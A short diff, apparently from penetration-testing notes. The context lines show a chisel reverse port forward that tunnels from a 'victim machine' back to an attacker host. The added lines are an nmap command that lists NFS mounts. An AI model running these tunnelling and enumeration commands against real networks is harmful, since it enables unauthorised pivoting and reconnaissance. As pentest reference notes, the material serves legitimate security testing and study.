@@ -268,3 +268,6 @@ First start server on attacker machine:
 On victim machine tranfer chisel.exe and run:
 chisel.exe client <attackermachine>:8000 R:8888:127.0.0.1:8888
 netstat -ano | grep 8000 to confirm the port forward on your machine.
+
+See mounted drives using nmap script:
+nmap -sV --script=nfs-showmount -oN output.nfs <ip>
